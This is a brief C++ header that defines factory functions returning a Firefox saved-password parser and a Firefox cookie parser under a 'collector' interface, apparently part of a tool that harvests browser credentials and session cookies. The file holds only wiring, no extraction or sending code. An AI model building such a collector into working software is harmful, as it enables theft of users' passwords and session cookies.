#pragma once

#include "ICollector.h"
#include "FireFoxParser.h"
#include "FireFoxCookiesParser.h"

namespace collector
{
	inline ICollector<AccountData>* create_password_collector()
	{
		return new FireFoxParser();
	}

	inline ICollector<CookieData>* create_cookies_collector()
	{
		return new FireFoxCookiesParser();
	}
}
